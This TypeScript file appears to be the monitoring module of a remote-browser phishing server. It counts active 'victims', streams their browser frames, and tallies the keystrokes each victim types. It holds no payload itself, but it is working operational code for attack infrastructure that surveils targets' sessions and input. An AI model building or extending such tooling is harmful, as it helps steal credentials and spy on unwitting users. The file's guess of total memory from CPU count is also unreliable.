import { memoryUsage, cpus } from 'os';
import type { BrowserInstance } from './types.js';

// ─── State ────────────────────────────────────────────────────────────────────

const serverStartTime = Date.now();
let lastCpuUsage = process.cpuUsage();
let lastCpuCheck = Date.now();

// Per-victim metrics tracking
const victimMetrics = new Map<string, VictimMetrics>();

interface VictimMetrics {
  frameCount: number;
  lastFrameTime: number;
  frameTimestamps: number[]; // Last 30 frames for FPS calculation
  latencySum: number;
  latencyCount: number;
  keystrokeCount: number;
}

// ─── System Metrics ───────────────────────────────────────────────────────────

export interface SystemMetrics {
  activeVictims: number;
  maxVictims: number;
  uptimeSeconds: number;
  memoryUsageMB: number;
  memoryTotalMB: number;
  memoryPercent: number;
  cpuPercent: number;
  totalSessionsToday: number;
}

export function getSystemMetrics(
  activeInstances: BrowserInstance[],
  maxVictims: number,
): SystemMetrics {
  const mem = memoryUsage();
  const totalMemory = getTotalSystemMemory();
  const memUsageMB = Math.round(mem.rss / 1024 / 1024);
  const memTotalMB = Math.round(totalMemory / 1024 / 1024);

  return {
    activeVictims: activeInstances.filter(i => i.claimed && i.victimSocket !== null).length,
    maxVictims,
    uptimeSeconds: Math.floor((Date.now() - serverStartTime) / 1000),
    memoryUsageMB: memUsageMB,
    memoryTotalMB: memTotalMB,
    memoryPercent: Math.round((memUsageMB / memTotalMB) * 100),
    cpuPercent: getCpuUsagePercent(),
    totalSessionsToday: getTodaySessionCount(),
  };
}

// ─── Per-Victim Metrics ───────────────────────────────────────────────────────

export interface VictimMetricsData {
  browserId: string;
  sessionDurationSeconds: number;
  currentFPS: number;
  averageLatencyMs: number;
  keystrokeCount: number;
  memoryUsageMB: number;
}

export function getVictimMetrics(instance: BrowserInstance): VictimMetricsData {
  const metrics = victimMetrics.get(instance.id);
  
  const sessionDuration = instance.connectedAt
    ? Math.floor((Date.now() - instance.connectedAt.getTime()) / 1000)
    : 0;

  const fps = metrics ? calculateFPS(metrics.frameTimestamps) : 0;
  const avgLatency = metrics && metrics.latencyCount > 0
    ? Math.round(metrics.latencySum / metrics.latencyCount)
    : 0;

  return {
    browserId: instance.id,
    sessionDurationSeconds: sessionDuration,
    currentFPS: fps,
    averageLatencyMs: avgLatency,
    keystrokeCount: metrics?.keystrokeCount ?? 0,
    memoryUsageMB: 0, // Will be populated if we add per-context memory tracking
  };
}

// ─── Metric Recording ─────────────────────────────────────────────────────────

export function recordFrame(browserId: string): void {
  let metrics = victimMetrics.get(browserId);
  if (!metrics) {
    metrics = {
      frameCount: 0,
      lastFrameTime: Date.now(),
      frameTimestamps: [],
      latencySum: 0,
      latencyCount: 0,
      keystrokeCount: 0,
    };
    victimMetrics.set(browserId, metrics);
  }

  const now = Date.now();
  metrics.frameCount++;
  metrics.frameTimestamps.push(now);
  
  // Keep only last 30 frames for FPS calculation
  if (metrics.frameTimestamps.length > 30) {
    metrics.frameTimestamps.shift();
  }
  
  metrics.lastFrameTime = now;
}

export function recordLatency(browserId: string, latencyMs: number): void {
  const metrics = victimMetrics.get(browserId);
  if (!metrics) return;
  
  metrics.latencySum += latencyMs;
  metrics.latencyCount++;
}

export function recordKeystroke(browserId: string): void {
  const metrics = victimMetrics.get(browserId);
  if (!metrics) return;
  
  metrics.keystrokeCount++;
}

export function clearVictimMetrics(browserId: string): void {
  victimMetrics.delete(browserId);
}

// ─── Internal Helpers ─────────────────────────────────────────────────────────

function calculateFPS(timestamps: number[]): number {
  if (timestamps.length < 2) return 0;
  
  const timeSpan = timestamps[timestamps.length - 1] - timestamps[0];
  if (timeSpan === 0) return 0;
  
  const fps = ((timestamps.length - 1) / timeSpan) * 1000;
  return Math.round(fps);
}

function getCpuUsagePercent(): number {
  const now = Date.now();
  const currentUsage = process.cpuUsage();
  const timeDiff = now - lastCpuCheck;
  
  if (timeDiff < 100) return 0; // Too soon to measure
  
  const userDiff = currentUsage.user - lastCpuUsage.user;
  const systemDiff = currentUsage.system - lastCpuUsage.system;
  const totalDiff = userDiff + systemDiff;
  
  // Convert microseconds to milliseconds and calculate percentage
  const cpuPercent = (totalDiff / 1000 / timeDiff) * 100;
  
  lastCpuUsage = currentUsage;
  lastCpuCheck = now;
  
  return Math.round(Math.min(cpuPercent, 100));
}

function getTotalSystemMemory(): number {
  const cpuList = cpus();
  // Rough estimate: assume 2GB per CPU core as baseline
  // This is a fallback; in production you'd use os.totalmem() but it's not available in all environments
  return cpuList.length * 2 * 1024 * 1024 * 1024;
}

let sessionCountToday = 0;
let lastSessionCountDate = new Date().toISOString().slice(0, 10);

export function incrementSessionCount(): void {
  const today = new Date().toISOString().slice(0, 10);
  if (today !== lastSessionCountDate) {
    sessionCountToday = 0;
    lastSessionCountDate = today;
  }
  sessionCountToday++;
}

function getTodaySessionCount(): number {
  const today = new Date().toISOString().slice(0, 10);
  if (today !== lastSessionCountDate) {
    return 0;
  }
  return sessionCountToday;
}
